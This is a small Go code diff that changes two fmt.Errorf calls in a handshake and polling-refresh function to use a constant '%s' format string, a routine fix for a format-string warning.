@@ -170,7 +170,7 @@ func refreshHandshake() error {
 	// Collect system info for new polling session
 	sysInfoReport, err := collectSystemInfo(getClientID())
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E19, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
 	}
 
 	// Initialize new polling config
@@ -182,7 +182,7 @@ func refreshHandshake() error {
 
 	// Start new polling with updated configuration
 	if err := startPolling(pollConfig, sysInfoReport); err != nil {
-		return fmt.Errorf(ErrCtx(E19, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E19, err.Error()))
 	}
 
 	return nil
